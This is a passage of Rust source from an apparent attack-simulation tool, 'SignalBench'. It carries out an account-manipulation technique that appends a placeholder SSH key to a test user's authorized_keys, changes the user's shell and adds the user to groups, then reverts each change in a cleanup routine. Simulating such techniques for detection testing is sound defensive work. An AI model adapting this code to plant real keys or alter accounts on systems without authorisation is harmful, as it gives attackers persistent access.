                .to_string();
            
            if home_dir.is_empty() {
                return Err("Failed to determine user home directory".to_string());
            }
            
            info!("User home directory: {home_dir}");
            
            // Phase 2: SSH Authorised Keys Manipulation
            if add_ssh_key {
                info!("Phase 2: Adding SSH authorised key...");
                
                let ssh_dir = format!("{home_dir}/.ssh");
                let auth_keys_file = format!("{ssh_dir}/authorized_keys");
                let backup_file = format!("/tmp/signalbench_authorized_keys_backup_{session_id}");
                
                // Create .ssh directory if it doesn't exist
                fs::create_dir_all(&ssh_dir)
                    .map_err(|e| format!("Failed to create .ssh directory: {e}"))?;
                
                // Set proper permissions on .ssh directory
                Command::new("chmod")
                    .args(["700", &ssh_dir])
                    .output()
                    .await
                    .ok();
                
                Command::new("chown")
                    .args([&test_username, &ssh_dir])
                    .output()
                    .await
                    .ok();
                
                // Backup existing authorized_keys if it exists
                if Path::new(&auth_keys_file).exists() {
                    fs::copy(&auth_keys_file, &backup_file)
                        .map_err(|e| format!("Failed to backup authorized_keys: {e}"))?;
                    artifacts.push(backup_file.clone());
                    info!("Backed up existing authorized_keys to {backup_file}");
                }
                
                // Generate a fake SSH public key (for demonstration)
                let fake_ssh_key = format!(
                    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSignalBenchTestKey{}== signalbench_test_key@signalbench\n",
                    &session_id[..16]
                );
                
                // Append the key
                let mut auth_keys_content = if Path::new(&auth_keys_file).exists() {
                    fs::read_to_string(&auth_keys_file).unwrap_or_default()
                } else {
                    String::new()
                };
                
                auth_keys_content.push_str(&format!("\n# SignalBench Test Key - Session {session_id}\n"));
                auth_keys_content.push_str(&fake_ssh_key);
                
                fs::write(&auth_keys_file, auth_keys_content.as_bytes())
                    .map_err(|e| format!("Failed to write authorized_keys: {e}"))?;
                
                // Set proper permissions
                Command::new("chmod")
                    .args(["600", &auth_keys_file])
                    .output()
                    .await
                    .ok();
                
                Command::new("chown")
                    .args([&test_username, &auth_keys_file])
                    .output()
                    .await
                    .ok();
                
                artifacts.push(auth_keys_file.clone());
                manipulation_data["ssh_key_added"] = serde_json::json!(true);
                manipulation_data["ssh_key_file"] = serde_json::json!(auth_keys_file);
                manipulation_data["ssh_key_backup"] = serde_json::json!(backup_file);
                
                info!("✓ Added SSH authorised key to {auth_keys_file}");
            }
            
            // Phase 3: Shell Modification
            if modify_shell {
                info!("Phase 3: Modifying user shell...");
                
                // Get original shell
                let original_shell_output = Command::new("sh")
                    .args(["-c", &format!("grep '^{test_username}:' /etc/passwd | cut -d: -f7")])
                    .output()
                    .await
                    .map_err(|e| format!("Failed to get original shell: {e}"))?;
                
                let original_shell = String::from_utf8_lossy(&original_shell_output.stdout)
                    .trim()
                    .to_string();
                
                manipulation_data["original_shell"] = serde_json::json!(original_shell);
                
                // Change shell to /bin/sh (different from typical /bin/bash)
                let new_shell = "/bin/sh";
                
                let chsh_output = Command::new("usermod")
                    .args(["-s", new_shell, &test_username])
                    .output()
                    .await;
                
                match chsh_output {
                    Ok(output) if output.status.success() => {
                        info!("✓ Changed shell from {original_shell} to {new_shell}");
                        manipulation_data["shell_modified"] = serde_json::json!(true);
                        manipulation_data["new_shell"] = serde_json::json!(new_shell);
                    }
                    Ok(output) => {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        warn!("Failed to change shell: {stderr}");
                    }
                    Err(e) => {
                        warn!("Failed to execute usermod for shell change: {e}");
                    }
                }
            }
            
            // Phase 4: Group Membership Manipulation
            if add_to_groups {
                info!("Phase 4: Modifying group memberships...");
                
                // Get original groups
                let groups_output = Command::new("groups")
                    .arg(&test_username)
                    .output()
                    .await
                    .map_err(|e| format!("Failed to get user groups: {e}"))?;
                
                let groups_str = String::from_utf8_lossy(&groups_output.stdout);
                let original_groups: Vec<String> = groups_str
                    .split_whitespace()
                    .skip(2)
                    .map(|s| s.to_string())
                    .collect();
                
                manipulation_data["original_groups"] = serde_json::json!(original_groups);
                info!("Original groups: {}", original_groups.join(", "));
                
                // Try to add user to some common groups (that likely exist)
                let test_groups = vec!["users", "cdrom", "audio", "video"];
                let mut added_groups = Vec::new();
                
                for group in test_groups {
                    // Check if group exists
                    let group_exists = Command::new("getent")
                        .args(["group", group])
                        .output()
                        .await
                        .map(|o| o.status.success())
                        .unwrap_or(false);
                    
                    if !group_exists {
                        continue;
                    }
                    
                    // Check if user is already in group
                    if original_groups.contains(&group.to_string()) {
                        continue;
                    }
                    
                    let usermod_output = Command::new("usermod")
                        .args(["-aG", group, &test_username])
                        .output()
                        .await;
                    
                    match usermod_output {
                        Ok(output) if output.status.success() => {
                            info!("✓ Added {test_username} to group: {group}");
                            added_groups.push(group.to_string());
                        }
                        Ok(output) => {
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            warn!("Failed to add to group {group}: {stderr}");
                        }
                        Err(e) => {
                            warn!("Failed to execute usermod for group {group}: {e}");
                        }
                    }
                }
                
                manipulation_data["groups_added"] = serde_json::json!(added_groups);
                info!("Added to {} groups: {}", added_groups.len(), added_groups.join(", "));
            }
            
            // Save manipulation data for cleanup
            fs::write(&artifacts_file, serde_json::to_string_pretty(&manipulation_data).unwrap())
                .map_err(|e| format!("Failed to save manipulation data: {e}"))?;
            
            let summary = format!(
                "Account manipulation complete: user={}, SSH_key={}, shell={}, groups_added={}",
                test_username,
                manipulation_data["ssh_key_added"].as_bool().unwrap_or(false),
                manipulation_data["shell_modified"].as_bool().unwrap_or(false),
                manipulation_data["groups_added"].as_array().map(|a| a.len()).unwrap_or(0)
            );
            
            info!("{summary}");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: summary,
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            info!("Starting account manipulation cleanup...");
            
            // Read manipulation data to understand what needs to be reverted
            let artifacts_file = artifacts.iter().find(|a| a.contains("account_manipulation") && a.ends_with(".json"));
            
            if let Some(data_file) = artifacts_file {
                if let Ok(content) = fs::read_to_string(data_file) {
                    if let Ok(data) = serde_json::from_str::<serde_json::Value>(&content) {
                        let username = data["username"].as_str().unwrap_or("");
                        let user_created = data["user_created"].as_bool().unwrap_or(false);
                        
                        // Revert group memberships
                        if let Some(groups_added) = data["groups_added"].as_array() {
                            for group in groups_added {
                                if let Some(group_name) = group.as_str() {
                                    info!("Removing {username} from group: {group_name}");
                                    Command::new("gpasswd")
                                        .args(["-d", username, group_name])
                                        .output()
                                        .await
                                        .ok();
                                }
                            }
                        }
                        
                        // Revert shell
                        if data["shell_modified"].as_bool().unwrap_or(false) {
                            if let Some(original_shell) = data["original_shell"].as_str() {
                                info!("Restoring original shell: {original_shell}");
                                Command::new("usermod")
                                    .args(["-s", original_shell, username])
                                    .output()
                                    .await
                                    .ok();
                            }
                        }
                        
                        // Restore authorized_keys backup
                        if data["ssh_key_added"].as_bool().unwrap_or(false) {
                            if let Some(backup_file) = data["ssh_key_backup"].as_str() {
                                if let Some(auth_keys_file) = data["ssh_key_file"].as_str() {
                                    if Path::new(backup_file).exists() {
                                        info!("Restoring authorized_keys from backup");
                                        fs::copy(backup_file, auth_keys_file).ok();
                                    } else {
                                        // Remove the added key manually
                                        info!("Removing added SSH key from authorized_keys");
                                        if let Ok(content) = fs::read_to_string(auth_keys_file) {
                                            let filtered: Vec<&str> = content.lines()
                                                .filter(|line| !line.contains("signalbench_test_key") && !line.contains("SignalBench Test Key"))
                                                .collect();
                                            fs::write(auth_keys_file, filtered.join("\n")).ok();
                                        }
                                    }
                                }
                            }
                        }
                        
                        // Delete user if it was created
                        if user_created {
                            info!("Removing created test user: {username}");
                            Command::new("userdel")
                                .args(["-r", username])
                                .output()
                                .await
                                .ok();
                        }
                    }
                }
            }
            
            // Remove artifact files
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            
            info!("Account manipulation cleanup complete");
            Ok(())
        })
    }
}